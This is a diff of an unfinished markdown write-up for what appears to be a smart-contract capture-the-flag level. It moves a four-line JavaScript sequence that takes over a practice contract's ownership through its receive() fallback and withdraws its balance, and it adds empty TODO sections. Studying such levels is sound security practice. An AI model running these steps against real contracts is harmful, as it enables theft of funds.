@@ -7,13 +7,6 @@ This smart contract has a vulnerability, because:
 
 - TODO
 
-```JavaScript
-await contract.contribute({value: 1});
-await contract.sendTransaction({value: 1 });
-await contract.owner();
-await contract.withdraw();
-```
-
 ```Solidity
 /** 
 * @notice This fallback function receive() is the main attack target, in order to pass the 
@@ -27,7 +20,7 @@ receive() external payable {
 }
 ```
 
-## The victim contract in detail
+## 🆘 The victim contract in detail
 
 ```yml
 The victim contract imports OpenZeppelin's safeMath here:
@@ -37,4 +30,61 @@ The victim contract imports OpenZeppelin's safeMath here:
 ```Solidity
 
 ```
+
+## ⚠️ The vulnerability in detail
+
+```yml
+The vulnerability:
+```
+
+- TODO
+
+```JavaScript
+
+```
+
+- TODO
+
+```Solidity
+
+```
+
+## 💥 The attack in detail
+
+```yml
+The attack:
+```
+
+- TODO
+
+```JavaScript
+await contract.contribute({value: 1});
+await contract.sendTransaction({value: 1 });
+await contract.owner();
+await contract.withdraw();
+```
+- TODO
+
+```Solidity
+
+```
+
+## 🩺 How can we fix this vulnerablity in the victim contract?
+
+- TODO
+
+```Solidity
+
+```
+
+
+
+
+
+
+
+
+
+
+
   
